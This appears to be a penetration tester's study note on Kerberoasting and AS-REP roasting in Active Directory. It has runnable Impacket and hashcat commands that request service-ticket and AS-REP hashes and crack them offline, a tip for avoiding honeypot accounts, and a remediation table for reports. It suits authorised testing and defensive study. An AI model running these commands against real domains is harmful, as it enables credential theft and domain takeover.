# Kerberoasting

## What Is It?

An attack against **service accounts** with SPNs (Service Principal Names). Very reliable path to Domain Admin.

## How Kerberos Works (Simplified)
1. User requests **TGT** with NTLM hash -> DC
2. User receives TGT encrypted with **krbtgt hash** <- DC
3. User requests **TGS** for a service (using TGT) -> DC
4. **User receives TGS encrypted with the SERVICE ACCOUNT's hash** <- DC  <- **We steal this**
5. User presents TGS to service -> access granted

**We exploit step 4** - the TGS is encrypted with the service account's hash. We request it legitimately, then crack it offline.

---

## Exploitation

### Step 1 - Get User SPNs and Hashes
```sh
sudo GetUserSPNs.py DOMAIN.local/jdoe:Password1 -dc-ip <DC-IP> -request
```

Output shows service accounts with SPNs and their TGS hashes.

> **No last logon = potential honeypot** - be careful targeting these.

### Step 2 - Save Hash to File
The hash starts with `$krb5tgs$23$...`

```sh
# Save the hash
echo '$krb5tgs$23$...' > tgs.txt
```

### Step 3 - Crack the Hash
```sh
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

# View cracked
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt --show
```

`-m 13100` = Kerberos 5 TGS-REP etype 23

---

## What You Get

Service account plaintext password -> authenticate as that service account.

If service account is a **Domain Admin** (common misconfiguration) -> instant DA.

---

## AS-REP Roasting (No Pre-Auth Required)

Different attack - targets users with "Do not require Kerberos preauthentication" enabled:

```sh
GetNPUsers.py DOMAIN.local/ -usersfile users.txt -dc-ip <DC-IP> -format hashcat

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Remediation (For Report Writing)

**Root cause:** Any authenticated domain user can request TGS tickets for any SPN. The ticket is encrypted with the service account's password hash - so the attacker gets material to crack offline. The weaker the password, the faster it cracks.

| Finding | Remediation |
|---|---|
| Service account with weak password | Enforce 25+ character passwords on all service accounts - makes offline cracking computationally infeasible |
| Service account has Domain Admin rights | Apply **least privilege** - service accounts should only have rights to the specific systems/resources they serve, not domain-wide admin |
| Many Kerberoastable accounts | Audit all accounts with SPNs set: `Get-DomainUser -SPN` - remove SPNs that are not needed |
| Service account is human-managed | Replace with **Group Managed Service Accounts (gMSA)** - AD generates a 240-byte cryptographically random password and auto-rotates it (default every 30 days). The password is never exposed to humans; AD distributes it on demand to authorized hosts. Cracking is computationally infeasible. |
| AS-REP roastable accounts | Enable "Kerberos preauthentication required" on all accounts - this is the default, only disable if a specific legacy system requires it |

**Key point for reports:** Kerberoasting is completely passive and requires only a low-privilege domain account. The only real fix is gMSA (removes the crackable password entirely) or 25+ char random passwords managed in a PAM vault.
